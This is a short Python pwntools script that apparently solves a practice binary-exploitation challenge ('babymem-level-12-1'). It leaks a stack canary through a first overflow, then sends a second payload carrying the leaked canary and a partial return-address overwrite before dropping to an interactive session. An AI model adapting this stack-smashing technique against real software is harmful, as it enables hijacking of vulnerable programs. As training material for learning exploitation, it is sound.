from pwn import * 

elf = ELF("/challenge/babymem-level-12-1")

io = elf.process()

# 88 from rbp

# first iter
payload = b"REPEAT" + b'A'*(66)

io.sendline(b"500")

io.sendline(payload)

io.recvuntil(b"A"*66)
io.recvuntil("\n")
val = io.recvuntil("\n")

val = val[:7]
val = b"\x00" + val

pay2 = b'A'*72 + val + b'A'*8 + b'\xc4' + b'\x13'

# Has to be exact, as usual
io.sendline(f"{len(pay2)}")
io.sendline(pay2)

io.interactive()
